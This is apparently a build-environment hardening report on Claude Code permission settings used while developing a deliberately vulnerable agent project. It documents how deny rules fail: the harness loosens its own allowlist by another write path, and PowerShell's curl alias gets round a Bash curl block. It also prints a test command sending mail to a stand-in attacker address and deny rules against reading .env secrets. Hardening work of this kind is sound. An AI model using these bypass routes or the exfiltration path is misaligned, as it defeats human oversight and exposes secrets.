# Build-Environment Hardening

**Scope note:** this document covers controls on the *development environment* — the Claude
Code instance used to build WITI — not WITI itself. WITI's deliberate vulnerabilities A–H
(see `VULN_CATALOG.md`) remain intentionally unpatched by design; that is a separate threat
model with a separate remediation track (`PORTFOLIO_PLAN.md` Phase 2).

## Layer 1 — Coding-agent harness

### Finding 1: an allowlist is not a control

The project's `.claude/settings.local.json` previously contained only an `allow` array. In
Claude Code, `allow` means *auto-approve without prompting* — not *permit only*. Commands not
on the list still ran, just after a manual prompt. So the file functioned as an
approval-fatigue reducer, not a security boundary: nothing was actually unreachable.

Enforcement exists only via `deny`, which takes precedence over `allow` and merges across
settings scopes (user, project, local) rather than being overridden by a lower scope. That
precedence — not the presence of an allowlist — is what makes it a boundary.

### Finding 2: model narration is not evidence

With the `Read(./.env)` and `Read(./.env.*)` deny rules temporarily removed, Claude Code was
asked to read and display `.env`. It refused, stating that its permission settings blocked
access — a claim that was false at that moment, since those rules had been removed. The
refusal is therefore attributable to model judgment, not harness enforcement. Notably, the
transcript showed "Read 1 file" immediately before the refusal, which — read on its own —
would look exactly like a successful, silent block.

To rule out a competing explanation, the user-level settings file at
`C:\Users\silve\.claude\settings.json` was checked directly: it contains no `permissions` key
at all, so no user-level deny rule could have produced the refusal either. With both the
project-level rule (removed at the time) and any user-level rule (absent entirely) ruled out,
"attributable to model judgment" is a conclusion, not an assumption.

**Conclusion: verify controls at the enforcement layer, not in the transcript.** This is
`PORTFOLIO_PLAN.md` Phase 2's "patch-effectiveness must be proven structurally, because the
model's pre-existing tendency to refuse can make before/after look identical" principle,
encountered live in my own tooling rather than in WITI.

**Remediation of test method:** retest using a `curl` deny rule instead. `curl
https://example.com` carries no model-side disposition to refuse, so a block has only one
explanation — enforcement, not judgment.

**Verification pending — see `build-env/screenshots/`:**
- `curl https://example.com` before/after the `Bash(curl *)` deny rule (Finding 2 remediation).
- `PowerShell Invoke-WebRequest` against the same target, to check the known gap in the
  `Bash(curl *)` rule noted under Current configuration, below.

### Finding 3: a control can do exactly what it says and still miss the threat

The allow array in the config reproduced below contains 19 entries; before this session it
contained 17. `Bash(mkdir -p "build-env/screenshots")` and
`Bash(touch "build-env/screenshots/.gitkeep")` were added during Task 1 of this same session,
while `Edit(./.claude/settings.local.json)` and `Write(./.claude/settings.local.json)` were
both denied at the time.

The deny rules cover the `Edit` and `Write` tools specifically. New permission entries
approved during a session are persisted through Claude Code's own internal permission-write
mechanism — not through the `Edit` or `Write` tools — so those deny rules never sat in the
path that actually changed the file. The rule behaved exactly as written; the rationale
stated for it ("the harness must not be able to loosen its own permission boundary") was not
achieved.

This is structurally the same failure mode as Findings 1 and 2: a control that was assumed to
cover a threat without verifying it against the actual mechanism in play. It is also the same
principle as "universal tools beat per-tool controls" — `Edit`/`Write` are two named tools,
but the permission system has its own write path outside of both.

Remediation belongs at Layer 2 (OS-level file permissions making the config read-only to the
agent's process), not Layer 1 — see Layer 2, below.

### Current configuration

`.claude/settings.local.json`, verbatim:

```json
{
  "permissions": {
    "allow": [
      "Bash(./.venv/Scripts/python.exe main.py)",
      "Bash(git init *)",
      "Bash(git add *)",
      "Bash(git commit -m ' *)",
      "Bash(git config *)",
      "Bash(cd C:\\\\Users\\\\silve\\\\OneDrive\\\\Desktop\\\\witi-agent\\\\files *)",
      "Bash(\".venv/Scripts/python.exe\" attacks/exfil_demo.py)",
      "Bash(git commit *)",
      "Bash(\".venv/Scripts/python.exe\" -c \"import json; json.load\\(open\\('memory.json', encoding='utf-8'\\)\\); json.load\\(open\\('inbox.json', encoding='utf-8'\\)\\); print\\('OK: both JSON files valid'\\)\")",
      "PowerShell(& \".venv\\\\Scripts\\\\python.exe\" -c \"import main; print\\(main.append_memory\\('INJECTED-TEST-ENTRY: proves memory accepts unfiltered content'\\)\\)\")",
      "PowerShell(& \".venv\\\\Scripts\\\\python.exe\" -c \"import main; print\\(main.read_memory\\(\\)\\)\")",
      "PowerShell(& \".venv\\\\Scripts\\\\python.exe\" -c \"import main; print\\(main.update_tracker\\('THROWAWAY-TEST-CONTENT: proves update_tracker wipes tracker.md wholesale'\\)\\)\")",
      "PowerShell(Copy-Item *)",
      "PowerShell(& \".venv\\\\Scripts\\\\python.exe\" -c \"import main; print\\(main.send_digest\\('attacker@evil-exfil.example', 'INJECTED-TEST-SUBJECT', 'INJECTED-TEST-BODY: proves send_digest accepts any caller-supplied recipient'\\)\\)\")",
      "Bash(git ls-files *)",
      "Bash(git log *)",
      "Bash(git status *)",
      "Bash(mkdir -p \"build-env/screenshots\")",
      "Bash(touch \"build-env/screenshots/.gitkeep\")"
    ],
    "deny": [
      "Edit(./.claude/settings.local.json)",
      "Write(./.claude/settings.local.json)",
      "Read(./.env)",
      "Read(./.env.*)",
      "Bash(curl *)"
    ]
  }
}
```

Deny-rule rationale:
- `Edit(./.claude/settings.local.json)` / `Write(./.claude/settings.local.json)` — the harness
  must not be able to loosen its own permission boundary, whether on its own initiative or
  under injected instruction. **See Finding 3:** this rationale is not fully achieved — the
  allow array can still grow via Claude Code's own permission-write mechanism, which these two
  tool-scoped rules do not cover.
- `Read(./.env)` — blocks direct reads of the secrets file.
- `Read(./.env.*)` — closes the glob variant (`.env.local`, `.env.production`, etc.) so the
  block isn't just literal-filename-deep.
- `Bash(curl *)` — closes a generic network-egress path that could exfiltrate file contents
  directly to a remote host, bypassing tool-level controls entirely.
  **Known gap — untested:** this rule is scoped to the `Bash` tool. In PowerShell, `curl` is
  an alias for `Invoke-WebRequest`, so the same egress path is likely still reachable via
  `PowerShell(...)`, which this rule does not match. No deny rule has been added for this yet.

None of the deny rules collide with the existing `allow` entries — the allow list is scoped
to specific `git`, Python, and PowerShell invocations, none of which touch `curl` or the
settings file — so no existing workflow is affected.

## Layer 2 — OS / process identity
Not yet implemented. Pending: OS-level file permissions making `.claude/settings.local.json`
read-only to the agent's process, per Finding 3's remediation above.

## Layer 3 — Sandbox / container
Not yet implemented.

## Layer 4 — Network egress
Not yet implemented.
